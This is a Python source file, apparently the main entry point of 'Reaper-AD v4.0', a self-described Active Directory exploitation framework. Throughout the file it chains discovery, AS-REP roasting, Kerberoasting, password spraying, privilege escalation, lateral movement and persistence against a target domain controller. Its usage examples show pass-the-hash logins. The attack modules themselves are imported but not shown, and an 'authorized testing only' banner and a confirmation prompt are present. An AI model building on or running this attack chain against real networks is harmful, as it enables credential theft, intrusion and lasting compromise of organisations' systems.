#!/usr/bin/env python3
"""
Reaper-AD v4.0 - COMPLETE AD Exploitation Framework
Now with REAL attack implementations
"""

import sys
import os
import argparse
import logging
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Add modules to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'modules'))

class ReaperAD:
    def __init__(self, target, username=None, password=None, domain=None, 
                 hashes=None, stealth=False, threads=5, timeout=10, output_dir='./reaper_output'):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.hashes = hashes
        self.stealth = stealth
        self.threads = threads
        self.timeout = timeout
        self.output_dir = output_dir
        
        # Initialize modules
        from modules.discovery import DiscoveryEngine
        from modules.credential import CredentialHarvester
        from modules.privilege import PrivilegeEscalator
        from modules.lateral import LateralMover
        from modules.persistence import PersistenceEngine
        from modules.reporting import ReportGenerator
        
        self.discovery = DiscoveryEngine(target, timeout)
        self.credential = CredentialHarvester(target, username, password, domain, hashes, stealth, threads)
        self.privilege = PrivilegeEscalator(target, username, password, domain, hashes)
        self.lateral = LateralMover(target, username, password, domain, hashes, stealth)
        self.persistence = PersistenceEngine(target, username, password, domain, hashes)
        self.reporter = ReportGenerator(output_dir)
        
        self.results = {
            'metadata': {
                'target': target,
                'domain': domain,
                'start_time': datetime.now().isoformat(),
                'args': {
                    'username': username,
                    'stealth': stealth,
                    'threads': threads
                }
            },
            'discovery': {},
            'credentials': [],
            'escalation': [],
            'lateral_movement': [],
            'persistence': [],
            'data_exfiltrated': []
        }
    
    def print_banner(self):
        banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║                R E A P E R - A D   v4.0                      ║
║                                                              ║
║        COMPLETE AD Exploitation Framework                    ║
║                                                              ║
║        WARNING: For authorized testing only!                 ║
║        Unauthorized use is illegal and unethical.            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
Target: {self.target}
Domain: {self.domain or 'Auto-detect'}
Mode: {'Stealth' if self.stealth else 'Aggressive'}
Threads: {self.threads}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        print(banner)
    
    def run_all(self):
        """Execute complete attack chain"""
        self.print_banner()
        
        # Ask for confirmation
        response = input(f"\n{Fore.YELLOW}[?] Continue with FULL attack chain? (y/N): {Style.RESET_ALL}")
        if response.lower() != 'y':
            print(f"{Fore.YELLOW}[!] Execution cancelled{Style.RESET_ALL}")
            return
        
        phases = [
            ("Discovery", self.run_discovery),
            ("Credential Harvesting", self.run_credential_harvesting),
            ("Privilege Escalation", self.run_privilege_escalation),
            ("Lateral Movement", self.run_lateral_movement),
            ("Persistence", self.run_persistence),
            ("Reporting", self.generate_report)
        ]
        
        for phase_name, phase_func in phases:
            print(f"\n{Fore.CYAN}{'»'*3} PHASE: {phase_name.upper()}{Style.RESET_ALL}")
            try:
                phase_func()
            except KeyboardInterrupt:
                print(f"{Fore.YELLOW}[!] Phase interrupted{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Phase failed: {e}{Style.RESET_ALL}")
                continue
    
    def run_discovery(self):
        """Run comprehensive discovery"""
        print(f"{Fore.CYAN}[*] Running comprehensive discovery...{Style.RESET_ALL}")
        
        # DC discovery
        dcs = self.discovery.find_domain_controllers()
        if dcs:
            print(f"{Fore.GREEN}[+] Found {len(dcs)} domain controllers{Style.RESET_ALL}")
            self.results['discovery']['domain_controllers'] = dcs
        
        # User enumeration
        users = self.discovery.enumerate_users()
        if users:
            print(f"{Fore.GREEN}[+] Enumerated {len(users)} users{Style.RESET_ALL}")
            self.results['discovery']['users'] = users[:20]  # Store first 20
        
        # Service discovery
        services = self.discovery.find_services()
        if services:
            print(f"{Fore.GREEN}[+] Found {len(services)} services{Style.RESET_ALL}")
            self.results['discovery']['services'] = services
        
        # Share enumeration
        shares = self.discovery.enumerate_shares()
        if shares:
            print(f"{Fore.GREEN}[+] Found {len(shares)} shares{Style.RESET_ALL}")
            self.results['discovery']['shares'] = shares
    
    def run_credential_harvesting(self):
        """Harvest credentials using multiple techniques"""
        print(f"{Fore.CYAN}[*] Harvesting credentials...{Style.RESET_ALL}")
        
        # AS-REP roasting
        asrep_hashes = self.credential.asrep_roast()
        if asrep_hashes:
            print(f"{Fore.GREEN}[+] AS-REP roasting: {len(asrep_hashes)} hashes extracted{Style.RESET_ALL}")
            self.results['credentials'].extend(asrep_hashes)
        
        # If we have credentials, try Kerberoasting
        if self.username and (self.password or self.hashes):
            kerberoast_hashes = self.credential.kerberoast()
            if kerberoast_hashes:
                print(f"{Fore.GREEN}[+] Kerberoasting: {len(kerberoast_hashes)} service hashes{Style.RESET_ALL}")
                self.results['credentials'].extend(kerberoast_hashes)
        
        # Password spraying (if we have users)
        if 'users' in self.results['discovery']:
            spray_results = self.credential.password_spray(self.results['discovery']['users'])
            if spray_results:
                print(f"{Fore.GREEN}[+] Password spray: {len(spray_results)} credentials found{Style.RESET_ALL}")
                self.results['credentials'].extend(spray_results)
    
    def run_privilege_escalation(self):
        """Attempt privilege escalation"""
        print(f"{Fore.CYAN}[*] Attempting privilege escalation...{Style.RESET_ALL}")
        
        if not self.results['credentials']:
            print(f"{Fore.YELLOW}[!] No credentials available for escalation{Style.RESET_ALL}")
            return
        
        # Try each compromised credential
        for cred in self.results['credentials']:
            if 'password' in cred or 'hash' in cred:
                escalation_paths = self.privilege.find_escalation_paths(cred)
                if escalation_paths:
                    print(f"{Fore.GREEN}[+] Found escalation paths for {cred.get('username', 'unknown')}{Style.RESET_ALL}")
                    self.results['escalation'].extend(escalation_paths)
                    break
    
    def run_lateral_movement(self):
        """Attempt lateral movement"""
        print(f"{Fore.CYAN}[*] Attempting lateral movement...{Style.RESET_ALL}")
        
        if not self.results['escalation']:
            print(f"{Fore.YELLOW}[!] No escalated credentials available{Style.RESET_ALL}")
            return
        
        # Try to move laterally
        movement_results = self.lateral.move()
        if movement_results:
            print(f"{Fore.GREEN}[+] Lateral movement successful{Style.RESET_ALL}")
            self.results['lateral_movement'].extend(movement_results)
    
    def run_persistence(self):
        """Establish persistence"""
        print(f"{Fore.CYAN}[*] Establishing persistence...{Style.RESET_ALL}")
        
        if not self.results['lateral_movement']:
            print(f"{Fore.YELLOW}[!] Cannot establish persistence without access{Style.RESET_ALL}")
            return
        
        persistence_mechanisms = self.persistence.establish()
        if persistence_mechanisms:
            print(f"{Fore.GREEN}[+] Persistence established{Style.RESET_ALL}")
            self.results['persistence'].extend(persistence_mechanisms)
    
    def generate_report(self):
        """Generate comprehensive report"""
        print(f"{Fore.CYAN}[*] Generating report...{Style.RESET_ALL}")
        
        self.results['metadata']['end_time'] = datetime.now().isoformat()
        
        report_file = self.reporter.generate(self.results)
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}                    EXECUTION COMPLETE{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}[SUMMARY]{Style.RESET_ALL}")
        print(f"  Target: {self.target}")
        print(f"  Domain Controllers: {len(self.results['discovery'].get('domain_controllers', []))}")
        print(f"  Users Enumerated: {len(self.results['discovery'].get('users', []))}")
        print(f"  Credentials Found: {len(self.results['credentials'])}")
        print(f"  Escalation Paths: {len(self.results['escalation'])}")
        print(f"  Lateral Movements: {len(self.results['lateral_movement'])}")
        print(f"  Persistence Mechanisms: {len(self.results['persistence'])}")
        
        print(f"\n{Fore.GREEN}[+] Full report saved to: {report_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] For authorized testing only!{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(
        description='Reaper-AD v4.0 - Complete AD Exploitation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
{Fore.YELLOW}Examples:{Style.RESET_ALL}
  {sys.argv[0]} dc.corp.local
  {sys.argv[0]} 192.168.1.10 -d CORP -u admin -p "Password123"
  {sys.argv[0]} target.local -H aad3b435b51404eeaad3b435b51404ee:... --stealth
  {sys.argv[0]} dc.example.com --all --threads 10 --output ./results

{Fore.RED}Warning: For authorized testing only!{Style.RESET_ALL}
        '''
    )
    
    parser.add_argument('target', help='Target Domain Controller')
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('-d', '--domain', help='Domain name')
    parser.add_argument('-H', '--hashes', help='NTLM hashes (LM:NT)')
    parser.add_argument('--stealth', action='store_true', help='Stealth mode')
    parser.add_argument('--threads', type=int, default=5, help='Thread count')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout in seconds')
    parser.add_argument('--output', default='./reaper_output', help='Output directory')
    parser.add_argument('--all', action='store_true', help='Run complete attack chain')
    
    args = parser.parse_args()
    
    try:
        reaper = ReaperAD(
            target=args.target,
            username=args.username,
            password=args.password,
            domain=args.domain,
            hashes=args.hashes,
            stealth=args.stealth,
            threads=args.threads,
            timeout=args.timeout,
            output_dir=args.output
        )
        
        if args.all:
            reaper.run_all()
        else:
            reaper.print_banner()
            print(f"\n{Fore.YELLOW}[!] Use --all for complete attack chain{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Run with --help for all options{Style.RESET_ALL}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
